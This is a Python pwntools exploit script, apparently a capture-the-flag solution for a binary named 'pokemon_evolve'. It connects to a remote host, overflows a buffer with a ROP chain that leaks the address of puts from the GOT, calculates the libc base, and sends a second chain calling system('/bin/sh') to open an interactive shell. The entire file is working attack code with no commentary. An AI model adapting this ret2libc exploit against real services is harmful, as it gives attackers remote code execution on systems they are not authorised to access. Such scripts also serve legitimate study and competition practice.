from pwn import *
from pprint import pprint

context.arch = 'amd64'
elf = ELF('./pokemon_evolve')

#p = elf.process()

p = remote('139.59.18.71',1234)

offset = 24

rop = ROP(elf)
rop.call(elf.symbols["puts"],[elf.got['puts']])
rop.call(elf.symbols['register_name'])
payload = [
    b'A'*offset,
    rop.chain()
]

payload = b''.join(payload)

p.sendline(payload)

p.recvuntil('Feed :')
p.recvline()
puts = u64(p.recvline().rstrip().ljust(8,b"\x00"))
print(puts)
log.info(f"puts found at {hex(puts)}")

libc = ELF("libc.so.6")
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address is {hex(libc.address)}")

rop = ROP(libc)
rop.call(libc.symbols["puts"], [next(libc.search(b"/bin/sh\x00"))])
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
rop.call(libc.symbols["exit"])
payload = [
    b'A'*offset,
    rop.chain()
]

payload = b''.join(payload)
p.sendline(payload)
p.interactive()